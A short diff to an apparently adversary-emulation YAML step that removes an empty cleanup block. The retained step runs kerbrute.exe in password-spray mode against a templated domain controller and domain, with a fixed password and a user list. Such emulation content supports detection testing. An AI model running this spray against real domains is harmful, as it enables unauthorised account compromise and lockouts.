@@ -38,6 +38,3 @@ steps:
     - name: password-spray-using-kerbrute-tool
       inline: "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc {{.Args.domaincontroller}} -d {{.Args.domain}} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n"
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
